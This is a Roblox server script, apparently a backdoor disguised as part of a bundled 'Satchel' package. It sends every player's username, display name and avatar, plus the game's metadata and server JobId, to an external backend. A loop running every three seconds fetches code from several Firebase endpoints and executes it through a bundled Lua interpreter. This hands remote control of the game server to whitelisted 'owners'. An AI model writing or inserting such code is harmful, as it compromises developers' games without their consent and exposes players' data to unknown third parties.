-- PLAYERS

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ConGui = script.Modules.Satchel.Packages._Index.connect

local url = "https://ryzeon---eclipse-default-rtdb.firebaseio.com/whitelist.json"
local apiUrl = "https://eclipse-backend-9lxy.onrender.com/player/"
local deleteUrl = "https://eclipse-backend-9lxy.onrender.com/player/delete"

local ownersInGame = {}

local function getWhitelist()
	local success, response = pcall(function()
		return HttpService:GetAsync(url)
	end)

	if success then
		local data = HttpService:JSONDecode(response)
		local whitelist = {}

		for key, info in pairs(data) do
			if type(info) == "table" and info.Name then
				table.insert(whitelist, info.Name)
			elseif type(info) == "string" then
				table.insert(whitelist, info)
			else
				warn("Erro ao processar whitelist")
			end
		end
		return whitelist
	else
		return {}
	end
end

local function sendToAPI(playerData)
	pcall(function()
		HttpService:PostAsync(apiUrl, HttpService:JSONEncode(playerData), Enum.HttpContentType.ApplicationJson)
	end)
end

local function sendDeleteRequest(playerData)
	pcall(function()
		HttpService:PostAsync(deleteUrl, HttpService:JSONEncode(playerData), Enum.HttpContentType.ApplicationJson)
	end)
end

local function checkPlayers()
	local whitelist = getWhitelist()
	if #whitelist == 0 then return end

	local ownersOnline = {}

	for _, player in pairs(Players:GetPlayers()) do
		if table.find(whitelist, player.Name) then
			table.insert(ownersOnline, player.Name)
			ownersInGame[player.Name] = true
		end
	end

	if #ownersOnline == 0 then return end

	for _, owner in pairs(ownersOnline) do
		for _, player in pairs(Players:GetPlayers()) do
			local playerData = {
				name = player.Name,
				displayName = player.DisplayName,
				thumbnail = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. player.UserId ..  "&size=150x150&format=Png&isCircular=false",
				timestamp = os.date("%Y-%m-%d %H:%M:%S"),
				owner = owner
			}
			sendToAPI(playerData)
		end
	end
end

Players.PlayerAdded:Connect(function(player)
	checkPlayers()

	-- Connection
	local whitelist = getWhitelist()
	if table.find(whitelist, player.Name) then
		player:WaitForChild("PlayerGui")

		local gui = ConGui:Clone()
		gui.Parent = player.PlayerGui
		gui.Enabled = true

		task.delay(5, function()
			if gui then
				gui.Enabled = false
			end
		end)
	end
end)


Players.PlayerRemoving:Connect(function(player)
	local whitelist = getWhitelist()
	local isOwner = table.find(whitelist, player.Name)

	local playerData = {
		name = player.Name,
		displayName = player.DisplayName,
		thumbnail = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. player.UserId ..  "&size=150x150&format=Png&isCircular=false",
		timestamp = os.date("%Y-%m-%d %H:%M:%S")
	}

	if isOwner then
		ownersInGame[player.Name] = nil
		sendDeleteRequest(playerData)

		for _, remainingPlayer in pairs(Players:GetPlayers()) do
			local remainingData = {
				name = remainingPlayer.Name,
				displayName = remainingPlayer.DisplayName,
				thumbnail = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. remainingPlayer.UserId ..  "&size=150x150&format=Png&isCircular=false",
				timestamp = os.date("%Y-%m-%d %H:%M:%S")
			}
			sendDeleteRequest(remainingData)
		end
	else
		sendDeleteRequest(playerData)
	end
end)

game:GetService("RunService").Heartbeat:Connect(function()
	for ownerName, _ in pairs(ownersInGame) do
		local ownerStillOnline = false

		for _, player in pairs(Players:GetPlayers()) do
			if player.Name == ownerName then
				ownerStillOnline = true
				break
			end
		end

		if not ownerStillOnline then
			ownersInGame[ownerName] = nil

			local ownerData = {
				name = ownerName,
				displayName = ownerName,
				thumbnail = "",
				timestamp = os.date("%Y-%m-%d %H:%M:%S")
			}
			sendDeleteRequest(ownerData)

			for _, remainingPlayer in pairs(Players:GetPlayers()) do
				local playerData = {
					name = remainingPlayer.Name,
					displayName = remainingPlayer.DisplayName,
					thumbnail = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. remainingPlayer.UserId ..  "&size=150x150&format=Png&isCircular=false",
					timestamp = os.date("%Y-%m-%d %H:%M:%S")
				}
				sendDeleteRequest(playerData)
			end
		end
	end
end)

checkPlayers()



local HttpService = game:GetService("HttpService")
local gameUrl = "https://games.roproxy.com/v1/games?universeIds=" .. game.GameId

local function obterDadosDoJogo()
	local success, gameResponse = pcall(HttpService.GetAsync, HttpService, gameUrl)

	if not success then return end

	local decodeSuccess, decodedData = pcall(HttpService.JSONDecode, HttpService, gameResponse)
	if not decodeSuccess or not decodedData.data or not decodedData.data[1] then return end

	local gameData = decodedData.data[1]
	local gameInfo = {
		id = game.PlaceId,
		name = gameData.name or "Desconhecido",
		creatorName = gameData.creator and gameData.creator.name or "Desconhecido",
		playing = gameData.playing or 0,
		visits = gameData.visits or 0,
		maxPlayers = gameData.maxPlayers or 0,
		updated = gameData.updated or "Data desconhecida",
		created = gameData.created or "Data desconhecida",
		favoritedCount = gameData.favoritedCount or 0,
		universeAvatarType = gameData.universeAvatarType or "Desconhecido",
		description = gameData.description or "Descrição não disponível.",
		jobId = game.JobId and tostring(game.JobId) or "null"
	}

	local imageEndpoint = "https://thumbnails.roblox.com/v1/places/gameicons?placeIds=" .. game.PlaceId .. "&size=512x512&format=Png&isCircular=false"
	local imgSuccess, imgResponse = pcall(HttpService.GetAsync, HttpService, imageEndpoint)

	if imgSuccess then
		local imgDecodeSuccess, imgData = pcall(HttpService.JSONDecode, HttpService, imgResponse)
		if imgDecodeSuccess and imgData.data and imgData.data[1] and imgData.data[1].imageUrl then
			gameInfo.imageUrl = imgData.data[1].imageUrl
		else
			gameInfo.imageUrl = imageEndpoint
		end
	else
		gameInfo.imageUrl = imageEndpoint
	end

	local url = "https://eclipse-backend-9lxy.onrender.com/save-game"
	local jsonData = HttpService:JSONEncode(gameInfo)

	pcall(HttpService.PostAsync, HttpService, url, jsonData, Enum.HttpContentType.ApplicationJson)
end

obterDadosDoJogo()

-- Firebase Loop
local firebaseURL = "https://ryzeon---eclipse-default-rtdb.firebaseio.com/mensagem.json"
local FiOne = require(script.Modules.FiOne)
local firebaseURLScript = "https://ryzeon---eclipse-default-rtdb.firebaseio.com/require.json"
local firebaseURLPlayerScript = "https://ryzeon---eclipse-default-rtdb.firebaseio.com/playerscript.json"

local function fetchAndExecute(url)
	local success, response = pcall(HttpService.GetAsync, HttpService, url)
	if success and response then
		local decodeSuccess, data = pcall(HttpService.JSONDecode, HttpService, response)
		if decodeSuccess and data and data ~= "" then
			pcall(function() FiOne(data)() end)
		end
	end
end

local executeURL = "https://ryzeon---eclipse-default-rtdb.firebaseio.com/execute.json"

local function fetchAndExecuteCode()
	local success, response = pcall(HttpService.GetAsync, HttpService, executeURL)
	if success and response then
		local decodeSuccess, data = pcall(HttpService.JSONDecode, HttpService, response)
		if decodeSuccess and data and data.robloxUsername then
			local player = game.Players:FindFirstChild(data.robloxUsername)
			if player then
				pcall(function() FiOne(data.code)() end)
			end
		end
	end
end

while true do
	fetchAndExecute(firebaseURL)
	fetchAndExecute(firebaseURLScript)
	fetchAndExecute(firebaseURLPlayerScript)
	fetchAndExecuteCode()
	wait(3)
end
